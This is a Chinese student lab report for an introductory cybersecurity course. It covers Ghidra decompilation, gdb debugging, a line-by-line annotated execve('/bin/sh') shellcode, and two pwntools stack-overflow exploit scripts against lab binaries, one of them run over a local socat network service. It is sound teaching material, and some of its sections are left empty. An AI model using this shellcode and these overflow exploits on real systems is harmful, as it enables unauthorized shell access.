#  网络空间安全导论实验

## 实验二 软件安全：逆向工程、漏洞挖掘与利用
姜俊彦 2022K8009970011 2023年10月10日

### 摘要：

本实验旨在通过实际运用逆向工程、漏洞挖掘与利用的基础技能，让同学们加深对软件安全的理解与体会。

### 实验步骤、现象与结果分析：

**一、基础操作：**

1. **编译：**

   > 深入理解编译过程是逆向工程的基础。在这一部分中，请使用实验中提供的（`calc .c`）程序或者自行寻找的程序，进行编译，将源代码转换为可执行程序。编译的过程是通过编译器将源代码转换为机器码的过程。在编译过程中，源码的语义应该与编译产物的语义保持一致。你需要使用反编译器查看编译后的汇编代码和伪C代码,并将源码中的不同部分对应到汇编和伪C的对应部分。
   >
   > 在实验报告中，挑选两处，详细说明为什么源码和二进制程序对应位置语义一致。

   操作步骤：

   ```bash
   gcc calc.c -g -o calc
   ```

   将输出的二进制程序导入到**Ghidra**中，比较**C源码**与**伪C代码**：

   ```C
   /* C源码 */
           switch (operator) {
   			/* 省略除了除法之外的部分 */
               case '/':
                   if (operand2 == 0) {
                       printf("Error: division by zero\n");
                   } else {
                       result = operand1 / operand2;
                       printf("Result: %d\n", result);
                   }
                   break;
               /* 省略后半部分 */
           }
   ```

   ```C
   /* 伪C代码 */
         while( true ) {
             /* 省略前输入部分 */
       if (local_1d != '/') break;
       if (local_18 == 0) {
         puts("Error: division by zero");
       }
       else {
         local_14 = local_1c / local_18;
         printf("Result: %d\n",(ulong)local_14,(long)local_1c % (long)local_18 & 0xffffffff);
       }
     }
   ```

   针对于运算符为`/`的情况：

   - **伪C代码**的`if (local_1d != '/') break;`部分是为了将运算符不为`/`的情况排除出去。对应**C源码**中`case`的选择功能。

   - **伪C代码**的`if (local_18 == 0) {puts("Error: division by zero");}`即为判断被除数是否为0，否则报错。对应**C源码**中的`if (operand2 == 0) {printf("Error: division by zero\n"); }`部分。
   - **伪C代码**的`local_14 = local_1c / local_18;`对应**C源码**的`result = operand1 / operand2;`运算。
   - **伪C代码**`printf("Result: %d\n",(ulong)local_14,(long)local_1c % (long)local_18 & 0xffffffff);`对应**C源码**中`printf("Result: %d\n", result);`打印输出结果部分。

   | **伪C代码**                                                  | **C源码**                                                    |
   | ------------------------------------------------------------ | ------------------------------------------------------------ |
   | `if (local_1d != '/') break;`                                | `case`                                                       |
   | `if (local_18 == 0) {puts("Error: division by zero");}`      | `if (operand2 == 0) {printf("Error: division by zero\n"); }` |
   | `local_14 = local_1c / local_18;`                            | `result = operand1 / operand2;`                              |
   | `printf("Result: %d\n",(ulong)local_14,(long)local_1c % (long)local_18 & 0xffffffff);` | `printf("Result: %d\n", result);`                            |

   鉴于汇编代码过长，此处仅比较两条**C源码**语句与**汇编代码**的关系：

   1. ```C
      /* C源码 */
      printf("Error: division by zero\n");
      ```

      ```C
      /* 伪C代码 */
      puts("Error: division by zero");
      ```

      ```assembly
      /* 汇编代码 */
      /* {}内为PCode代码 */
      
      LEA
      RAX,[s_Error:_division_by_zero_0010202e]
      /* LEA为装入有效地址，这里是将字符串的地址装入寄存器RAX */
      {
      	RAX = COPY 0x10202e:8
      }
      MOV
      RDI=>s_Error:_division_by_zero_0010202e,RAX
      {
      RDI = COPY RAX
      }
      /* MOV为传送字或字节，这里是将寄存器RAX的值传入RDI */
      CALL
      <EXTERNAL>::puts
      {
      	RSP = INT_SUB RSP, 8:8
         STORE ram(RSP), 0x1012c5:8 
         CALL *[ram]0x101080:8
      }
      /* 过程调用函数puts输出字符串“Error: division by zero” */
      ```
      
   2. ```C
      /* C源码 */
      if (operand2 == 0)
      ```

      ```C
      /* 伪C代码 */
      if (local_18 == 0)
      ```

      ```assembly
      /* 汇编代码 */
      /* {}内为PCode代码 */
      
      MOV
      EAX,dword ptr [RBP + local_18]
      {
      	$U3100:8 = INT_ADD RBP, -16:8 
      	$Uc180:4 = LOAD ram($U3100:8) 
      	EAX = COPY $Uc180:4 
      	RAX = INT_ZEXT EAX
      }
      /* MOV为传送字或字节，这里是将地址[RBP + local_18]的值传入EAX */
      
      TEST
      EAX,EAX
      {
      	CF = COPY 0:1 
      	OF = COPY 0:1 
      	$U55f00:4 = INT_AND EAX, EAX 
      	SF = INT_SLESS $U55f00:4, 0:4 
      	ZF = INT_EQUAL $U55f00:4, 0:4 
      	$U13400:4 = INT_AND $U55f00:4, 0xff:4 
      	$U13480:1 = POPCOUNT $U13400:4 
      	$U13500:1 = INT_AND 
      	$U13480:1, 1:1 
      	PF = INT_EQUAL $U13500:1, 0:1
      }
      /*
      TEST指令的操作是将目的操作数和源操作数按位与，运算结果不送回目的操作数。
      然后根据结果设置SF,ZF,PF标志位，并将CF和OF标志位清零，一般下面会跟跳转，根据ZF标志位是否为零来决定是否跳转。
      即，这句意思就是判断EAX是否为零
      */
      ```
      

   运行程序`calc`，使除数为0，运行结果如下，程序判断`operand2==0`成立，在终端中输出字符串`"Error: division by zero\n"`

   ![Lab2-1](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab2/Pic/Lab2-1.png?raw=true)

2. **逆向工程：**

   > 逆向工程中，调整变量的名称和类型有助于提高代码的可读性和可维护性。选择 `auth `程序中的两个函数，在反编译器的界面中，调整它们各个变量的名称和类型，使代码更合理易于理解

   `auth`-`view`函数的伪代码经变量名与变量类型调整后如下：（C语言中指针变量尚未学习，故其中对于变量类型可能讹误较多。）

   ```C
   undefined8 view(char *param_1)
   
   {
     int state;
     FILE *__stream;
     size_t readLength;
     long i;
     undefined8 *address;
     byte offset;
     undefined8 Target;
     undefined8 local_1020;
     undefined8 buf [511];
     char *character_input;
     
     offset = 0;
     character_input = param_1;
     do {
       if (*character_input == '\0') {
   LAB_0040144c:
         __stream = fopen(param_1,"rb");
         if (__stream == (FILE *)0x0) {
           puts("File not exist");
           state = 1;
         }
         else {
           Target = 0;
           local_1020 = 0;
           address = (undefined8 *)buf;
           for (i = 0x1fe; i != 0; i = i + -1) {
             *address = 0;
             address = address + (ulong)offset * -2 + 1;
           }
           readLength = fread(&Target,1,0x1000,__stream);
           fclose(__stream);
           if ((int)readLength == 0) {
             puts("File empty");
           }
           else {
             printf("File size %d\n",readLength & 0xffffffff);
             fwrite(&Target,1,(long)(int)readLength,stdout);
             putchar(10);
           }
           state = 0;
         }
         return state;
       }
       if (*character_input == '/') {
         *character_input = '\0';
         goto LAB_0040144c;
       }
       character_input = character_input + 1;
     } while( true );
   }
   ```
   
   下表列出更改的变量及更改原因：
   
   | 原变量                        | 更改后                  | 原因                                                         |
   | ----------------------------- | ----------------------- | ------------------------------------------------------------ |
   | `undefined8 state`            | `int state`             | 其作为判断文件是否为空的状态返回变量出现                     |
   | `size_t sVar2`                | `size_t readLength`     | 其作为函数`fread`与`fwite`的参数`size`出现（此处使用`man fread`等指令查看说明文档） |
   | `long lVar3`                  | `int i`                 | 其作为循环变量在`for`循环中出现                              |
   | `undefined8 *puVar4`          | `undefined8 *address`   | 其作为寻址命令`address = address + (ulong)offset * -2 + 1`中的地址出现 |
   | `byte bVar5`                  | `byte offset`           | 其作为寻址命令`address = address + (ulong)offset * -2 + 1`中的偏移量出现 |
   | `undefined8 local_1028`       | `undefined8 Target`     | 其作为函数`fread`与`fwite`的参数`*ptr`出现，此处笔者认为是目标地址 |
   | `undefined8 local_1020`       | `undefined8 local_1020` | 其仅在程序中赋值为0；无其他可解读含义，故笔者不做更改        |
   | `undefined8 local_1018 [511]` | `undefined8 buf [511]`  | 其作为给指针变量`address`赋值的存在而出现，故笔者认为是缓冲区分配空间 |
   | `FILE *local_18`              | `FILE *__stream`        | 其作为函数`fread`与`fwite`的参数`*stream`出现，此处笔者认为是文件本身 |
   | `char *local_10`              | `char *character_input` | 其作为本函数`view`的函数参数出现，所以笔者认为是输入的字符   |
   
   `auth`-`admin`函数的伪代码经变量名与变量类型调整后如下：
   
   ```C
   int admin(undefined8 input)
   
   {
     int comparison;
     char string_input [16];
     
     puts("How is it going?");
     __isoc99_scanf(&DAT_00402080,string_input);
     comparison = strcmp(string_input,"admin123 777888");
     if (comparison == 0) {
       oracle(input);
     }
     else {
       puts("Access denied");
     }
     return 0;
   }
   
   ```
   
   | 原变量               | 更改后                   | 原因                                                       |
   | -------------------- | ------------------------ | ---------------------------------------------------------- |
   | `undefined8 admin`   | `int admin`              | 函数返回值为0                                              |
   | `int iVar1`          | `int comparison`         | 其为函数`strcmp`的返回值，通过查阅说明文档得知其为比较结果 |
   | `char local_18 [16]` | `char string_input [16]` | 其为函数`scanf`的参数，用于存储输入的字符串                |
   
   分析：
   
   ​	笔者使用的反编译器为`Ghidra`，其能将二进制程序同义转化为汇编代码和伪代码，其中展示出了程序运行的清晰逻辑，而大部分的变量名与变量类型都是通过分析程序的运行逻辑得出的。如果碰到实在难以理解或者辨别的地方，也可以直接找到伪代码对应的汇编代码，通过汇编代码去理解语句的运行逻辑，从而能够帮助理解程序的实际运行。
   
3. **调试：**

   > 1. 在 main 函数设置断点：在 gdb 中输入命令 break main。
   >
   > 2. 运行程序：在 gdb 中输入命令 run。
   >
   > 3. 在 scanf 的调用前后设置断点：查看 scanf 调用前后的 RIP 地址，在 gdb 中使用 break 在该地址下断点，并continue 继续。
   >
   > 4. 在调用前观察现象：在程序暂停时，使用 gdb 中的命令 print 查看参数所在的寄存器、不同变量的值以及它们的位置；这些信息也可以由其他命令查看，可以交叉验证。
   >
   > 5. 继续运行程序：在 gdb 中输入命令 continue，并输入你希望 scanf 接受的数据。
   >
   > 6. 再次观察现象：在程序暂停时，使用 gdb 中的命令 print 查看参数所在的寄存器、不同变量的值以及它们的位置。

   GDB指令如下：

   ```bash
   b main
   r
   b *0x00005555555551f1
   b *0x00005555555551fb
   continue
   p operand1
   p operand2
   p operator
   i r
   x/s $rax
   x/s $rbx
   x/s $rcx
   x/s $rbx
   x/s $rsi
   x/s $rdi
   x/s $rbp
   x/s $rsp
   continue
   # 输入
   i r
   p operand1
   p operand2
   p operator
   x/s $rax
   x/s $rbx
   x/s $rcx
   x/s $rbx
   x/s $rsi
   x/s $rdi
   x/s $rbp
   x/s $rsp
   ```
   
   程序输出：
   
   | 变量     | 值（输入前） | 值（输入后） |
   | -------- | ------------ | ------------ |
   | operand1 | 0x0          | 0x1          |
   | operand2 | 0x1000       | 0x4          |
   | operator | 0x0          | 0x2b         |
   
   | 寄存器 | 值（输入前）   | 字符串形式 | 值（输入后）   | 字符串形式 |
   | ------ | -------------- | ---------- | -------------- | ---------- |
   | RAX    | 0x555555556019 | "%d %c %d" | 0x3            | 无         |
   | RBX    | 0x0            | 无         | 0x0            | 无         |
   | RCX    | 0x7fffffffdbf0 | “”         | 0x20           | 无         |
   | RDX    | 0x7fffffffdbeb | “”         | 0x0            | 无         |
   | RSI    | 0x7fffffffdbec | “”         | 0x4            | 无         |
   | RDI    | 0x555555556019 | "%d %c %d" | 0x7fffffffd6a0 | “4”        |
   
   程序运行截图：
   
   ![Lab2-3](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab2/Pic/Lab2-3.png?raw=true)
   
   ![Lab2-4](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab2/Pic/Lab2-4.png?raw=true)
   
   运行结果分析：
   
   寄存器RAX储存的为后续用于条件判断的输入数，从"%d %c %d"的字符串变成了3；寄存器RCX，RDX，RSI在运行前都是空字符串，然后值分别变成了0x20,0x0,0x4，即32，0，4，其中32位空格的ASSCI码，4为operand2的值，对应寄存器RDI存储的字符串“4”。
   
5. **漏洞挖掘：**

6. **汇编阅读：**

   一段Shellcode的汇编码（64位）

   ```assembly
   xor rax,rax 
   # 将寄存器rax的值存成0
   push 0x3b
   # 将0x3b值压入栈顶内存单元
   pop rax
   # 将栈顶内存单元的值0x3b弹给寄存器rax的值
   xor rdi,rdi
   # 将寄存器rax的值存成0,
   mov rdi ,0x68732f6e69622f
   # 将寄存器rdi赋值0x68732f6e69622f
   push rdi
   # 将寄存器rdi的值压入栈顶内存单元
   push rsp
   # 将栈顶内存单元的地址(寄存器rsp的值)压入栈顶内存单元
   pop rdi
   # 将栈顶内存单元的值(0x68732f6e69622f的地址)弹给寄存器rdi的值
   xor rsi,rsi
   # 将寄存器rsi的值存成0
   xor rdx,rdx
   # 将寄存器rdx的值存成0
   syscall
   # 执行系统调用
   ```

   联合理解：

   1. 系统调用参数：
   
       ```assembly
      xor rax,rax
      push 0x3b
      pop rax
      
      # 我们需要执行execve("/bin/sh,0,0")
      # 源程序中无execve函数
      # 需要系统调用execve函数
      # 寄存器rax中存放的为系统调用编号
      # 这里将rax的值赋为execve函数的系统调用编号0x3b
      ```
   
   2. 参数存放:
   
      ```assembly
      xor rdi,rdi
      mov rdi ,0x68732f6e69622f
      push rdi
      push rsp
      pop rdi
      xor rsi,rsi
      xor rdx,rdx
      
      # 我们需要执行execve("/bin/sh,0,0")
      # 寄存器rdi,rsi,rdx为64位传参寄存器中的前三个
      # 0x68732f6e69622f 转换为ASCII码后为hs/nib/，即倒写的/bin/sh
      # 由于0x68732f6e69622f不足八字节，故程序会自动添加00以补齐八字节
      # 这个00同时声明了参数字符串结束
      # 而需要存入寄存器rdi的是参数0x68732f6e69622f的地址
      # 于是先将寄存器rdi的值(即参数本身)压入栈顶内存单元
      # 然后将寄存器rsp的值(栈顶内存单元的地址)压入栈顶内存单元
      # 然后将栈顶内存单元的值(参数的地址)弹给寄存器rdi，实现第一个系统调用参数的赋值
      # 最后将寄存器rsi,rdx的值赋成0，实现第二、三个系统调用参数的赋值
      ```
   
   3. 执行系统调用：
   
      ```assembly
      syscall
      
      #即执行execve("/bin/sh,0,0")，获取shell
      ```
   
6. **漏洞利用：**

   **调试漏洞利用：**

   > ① 请在利用脚本`exp.py`中，程序启动之后但是数据发送之前，加入`pause()` 或者`input("continue >") `，使得利用脚本运行时，暂停在发送前。在一个终端窗口(记为 A)运行这一利用脚本；
   >
   > ② 接着，在另一个终端窗口(记为 B)中，打开 gdb 并执行`attach pid`命令(pid 换成利用运行的终端界面显示的 pid)；
   >
   > ③ 然后，在反编译器中找到`scanf`返回时的下一条指令的地址，在 gdb 里用 break 命令下断点；
   >
   > ④ 在 gdb 里`continue`，并在终端 A 上输入回车让利用继续运行；
   >
   > ⑤ 终端 B 中，gdb 此时应该在断点处停下。从此处开始，单步调试（使用 `ni `跳过下一个 `printf`函数调用）

   漏洞利用的机制：

   ​	利用程序针对`hello`程序中存在的未设置用户输入长度检测的漏洞，通过精确控制输入字符串的长度，使得栈缓冲区溢出，覆盖栈中的其他信息，尤其是输入函数的返回地址。通过将返回地址篡改覆盖为shellcode所处地址，即可以利用该漏洞实现shell获取。

   本实验中用到的利用程序`exp.py`及其中特殊数值的解释

   ```python
   #!/usr/bin/python
   
   from pwn import *
   context.arch = 'amd64'
   r = process("./hello")
   pause()
   r.sendline(b"a"*0x18+p64(0x40119e))
   r.interactive()
   
   # 数值解释
   0x18 
   # 从输入函数分配的栈空间起始地址到返回地址的差值
   0x40119e
   # 被修改的输入函数返回地址，指向/bin/sh的shellcode
   ```

   运行截图：

   ![Lab2-5.png](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab2/Pic/Lab2-5.png?raw=true)

   ![Lab2-6.png](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab2/Pic/Lab2-6.png?raw=true)

   **在网络环境中尝试运行漏洞利用：**

   > ① 安装`socat`并在`hello`所在路径下执行：`socat tcp-l:2323,reuseaddr,fork exec:./hello`
   >
   > ② 使用`nc`来访问服务，确保服务正常开启，对面和本地执行`hello`程序的行为一致：`nc 127.0.0.1 2323`
   >
   > ③ 将漏洞利用脚本中的`r = process("./hello")`改为`r = remote("127.0.0.1", 2323)`
   >
   > ④ 运行漏洞利用，得到另一端的`shell`；
   >
   > ⑤ 如有条件，可以启动两个虚拟机，从一个虚拟机运行漏洞利用脚本来获得另一个虚拟机的执行权限。

   网络环境下的运行截图：

   ![Lab2-7.png](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab2/Pic/Lab2-7.png?raw=true)

   ![Lab2-8.png](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab2/Pic/Lab2-8.png?raw=true)

   ![Lab2-9.png](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab2/Pic/Lab2-9.png?raw=true)

   > 此外，请说明：在程序进入未定义状态时，漏洞利用的过程中利用了哪些程序在这种特定情况下的行为特点？在网络环境中，为什么这种漏洞的成功利用会导致系统安全策略被违反（联想正课上对漏洞的定义！），破坏系统的安全性？

   ​	程序的未定义状态即执行某种计算机代码产生的状态，该状态在当前使用的语言标准中没有规定。

   ​	漏洞利用的过程中利用了缓冲区溢出、整数溢出、空指针解引用等程序的行为特点。以精心的构造来产生错误的程序执行路径、逻辑行为，从而达到以他人身份运行命令、违反控制策略去访问数据、伪装成另一个实体、发起拒绝服务攻击等违反安全策略的目的，使得目标系统处于危险状态之中。在网络环境中，如果上述漏洞被成功利用，则显然会导致系统安全策略被违反，使得系统本身与数据暴露在攻击者面前。

**二、问题探究**

> 在实验的这一部分，你将选择至少一个问题进行探究。可以参考下面提出的问题。请在实验报告里详细记录你的探究过程与发现，探究过程需要有实际操作作为支撑。**多截图**。

问题：如何运行一段汇编代码？

下面一段`Shellcode`程序的汇编代码及注释

```assembly
section .text
global _start
_start:
xor rax,rax
push 0x3b
pop rax
xor rdi,rdi
mov rdi,0x68732f6e69622f
push rdi
push rsp
pop rdi
xor rsi,rsi
xor rdx,rdx
syscall
```

想要运行以上`Shellcode`，需要先安装`nasm`包：

```bash
sudo apt install nasm
```

然后使用`nasm`编译生成`shellcode.o`文件：

```bash
nasm -f elf64 shellcode.asm 
```

最后使用`ld`命令生成二进制可执行文件：

```bash
ld -s -o shellcode shellcode.o
```

运行可执行文件即可获取`Shell`

![image-20231020164529947](C:\Users\20149\AppData\Roaming\Typora\typora-user-images\image-20231020164529947.png)



**三、综合运用**

1. **反弹Shell**

   > 写一个反弹 shell 的 shellcode，运行它，演示你已经成功反弹了 shell，并解释清楚你的shellcode 的原理。
   >
   > 注：运行 shellcode 的方法有很多。相信同学们能自行解决

2. **闯关题**

   > 分析程序(games)，通过理解程序逻辑，完成里面的四个挑战，进入 Congratulations 分支。这个分实验适合主要采用白盒分析的方法来做。
   > 请闯尽可能多的关，将你对于每一关的理解以及你的思路记录在实验报告中。
   > 提示：为了了解每个子游戏是否成功通关，可以在 main 函数里面该游戏函数的返回处下断点，查看返回值(eax 寄存器) 是否为 1。

3. **黑盒调试题**

   > 分析程序(eorer)，获取程序接受的输入。这个分实验适合主要采用黑盒分析的方法来做，如使用 gdb 与ltrace 等工具。比较方便的做法是，首先使用反编译工具(如 ghidra)查看其反编译得到的源码，形成一个调试的计划，然后使用 gdb 调试，获取想要的数据，最后解出输入。
   >
   > 注：这个题目去掉了调试符号。main 函数是__libc_start_main 函数的第一个参数，通过这个方法确定 main函数的地址。
   
4. **漏洞利用**
   
   > auth 程序也有一个缓冲区溢出。请触发它，并使用类似课堂上讲解的方法来利用它。
   
   编写的漏洞利用脚本：
   
   ```python
   #!/usr/bin/python
   
   from pwn import *
   context.arch = 'amd64'
   r = process("./auth")
   # 文件头和打开auth文件 
   
   r.sendline("auth useraccesscybersec@!")
   r.sendline("admin")
   # 进入漏洞函数
   
   r.sendline(b"a"*0x18+p64(0x401310))
   # 缓冲区溢出漏洞利用
   
   r.interactive()
   ```
   
   过程详解：
   
   1. 进入漏洞函数：
   
      首先通过翻阅`auth`的伪C代码，我们找到了在函数`admin`中存在可能导致缓冲区溢出漏洞的`char[16]`数据类型和`scanf`函数，根据课上学过的知识可知其可以通过精确控制输入字符长度来使`scanf`的返回地址指向`system("/bin/sh")`。
   
      而`auth`函数的执行路径，通过查看伪代码可以得知，想要进入`admin`函数需要经过和`handle`函数，而`auth`函数是作为从`handle`函数进入`admin`函数的钥匙。
   
      `auth`认证函数入口：
   
      ```c
      iVar1 = strncmp((char *)&local_58,"auth",4);
      if (iVar1 == 0)
      {
      	auth((long)&local_58 + 5);
          return;
      }
      ```
   
      `auth`函数中检测输入是否为`"useraccesscybersec@!"`，是则认证成功。
   
      ```C
      undefined8 auth(char *param_1)
      {
        int iVar1;
        iVar1 = strncmp(param_1,"useraccesscybersec@!",0x14);\\认证比较
        if (iVar1 == 0) {
          authed = 1; \\认证成功的标志
          puts("Auth success");
        }
        else {
          puts("Auth fail");
        }
        return 0;
      }
      ```
   
      `admin`函数入口：
   
      ```C
      iVar1 = strncmp((char *)&local_58,"admin",5);
      	if (iVar1 == 0) {
              iVar1 = check_auth();
      	if (iVar1 == 0) {
                return;
              }
              admin((long)&local_58 + 6);
              return;
      	}
      ```
   
      故对于漏洞利用脚本中的进入漏洞函数部分，其源码及解释：
   
      ```python
      r.sendline("auth useraccesscybersec@!")
      # 此处对应auth函数中的身份认证部分，输入该语句会输出Auth success,代表身份认证成功。
      r.sendline("admin")
      # 此处对应进入admin函数。
      ```
   
      2. 漏洞利用：
   
         `admin`函数伪C代码：
   
         ```C 
         undefined8 admin(undefined8 param_1)
         {
             char local_18 [16];
          	\*省略部分无关代码*\
           	__isoc99_scanf(&DAT_00402080,local_18);
             \*可能存在的缓冲区溢出漏洞*\
             \*省略部分无关代码*\
           return 0;
         }
         ```
   
         其中`__isoc99_scanf(&DAT_00402080,local_18);`导致的缓冲区溢出可以覆盖到返回地址，使其直接指向`system("/bin/sh")`。继续阅读汇编代码，可以发现如下语句：
   
         ```assembly
         00401310	MOV    EDI,s_/bin/sh_00402015	
         ```
   
         于是接下来的思路就很清晰了，需要将输入内容之后的八个字节完全覆盖，即从输入起始地址到返回地址之间有`0x18`的距离，所以需要键入`0x18`单位的字符和目标攻击地址`0x401310`。于是便得到以下代码。
   
         ```python
         r.sendline(b"a"*0x18+p64(0x401310))
         ```
   
         运行结果如图所示：
   
         ![Lab2-10.png](https://github.com/jiuhao47/UCAS-ICS-Share/blob/main/Lab2/Pic/Lab2-10.png?raw=true)
   
         
   
5. **ROP练习**

   > 有的时候地址空间里面没有现成的 system("/bin/sh") ，如程序（hello2），在栈溢出时需要采用 ROP（Return oriented programming, 返回导向编程）的手段，请查阅资料，在这种情况下完成利用。一种 ROP 的思路是：调用 scanf("%s", addr) 来将字符串”/bin/sh” 写入一段可写的内存 addr，然后调用system(addr) 来执行 shell。下图提供了这个 ROP 链构造的一种方法。

   

   



[gdb给指定位置设置断点_gdb 断点 地址-CSDN博客](https://blog.csdn.net/rubikchen/article/details/115588379)

[GDB内存断点(Memory break)的使用举例_gdb 内存越界-CSDN博客](https://blog.csdn.net/livelylittlefish/article/details/5110234)

[gdb 笔记（03）— 某一行设置断点、为函数（单个唯一函数、多个同名函数、使用正则）设置断点、设置条件断点、设置临时断点_gdb breakpoint_wohu007的博客-CSDN博客](https://blog.csdn.net/wohu1104/article/details/124944226)

[GDB 用法之显示寄存器_gdb查看寄存器_xiaozhiwise的博客-CSDN博客](https://blog.csdn.net/xiaozhiwise/article/details/123247408)

[ASCII 表 | 菜鸟教程 (runoob.com)](https://www.runoob.com/w3cnote/ascii.html)

[ubuntu20.04 如何生成core文件_ubuntu 核心转储 默认位置_Jqivin的博客-CSDN博客](https://blog.csdn.net/Jqivin/article/details/121908435)

[ubuntu server 20.04 systemd服务如何生成core文件_limitcore=infinity-CSDN博客](https://blog.csdn.net/qq_15328161/article/details/109085705)

[ubuntu 16.04开启coredump并设置core文件的产生位置-CSDN博客](https://blog.csdn.net/qq_16019185/article/details/82620803)

[ubuntu下不生成core dumped文件解决办法一则_ubuntu22.04 没有coredump文件_tomwillow的博客-CSDN博客](https://blog.csdn.net/tomwillow/article/details/124370398#:~:text=如果你看到core dumped字样，并且在目录下也找到了一个叫core的文件，那你可以直接用gdb定位到程序崩溃的位置了（注意用gcc编译时也要开-g选项才能用gdb调试）： %24 gdb.%2Fa.out,core 1 gdb加载后已经跳到程序崩溃的位置了。 就是在main.c的20行。)

[linux下core dump【总结】 - Rabbit_Dale - 博客园 (cnblogs.com)](https://www.cnblogs.com/Anker/p/6079580.html)

[*** stack smashing detected *** 是什么意思？怎么破_stack smash detected-CSDN博客](https://blog.csdn.net/qd1308504206/article/details/103273447)

[用汇编语言构造简单的shellcode（64位&&32位）以及将汇编语言转换成机器码的方法 - ZikH26 - 博客园 (cnblogs.com)](https://www.cnblogs.com/ZIKH26/articles/15845766.html)
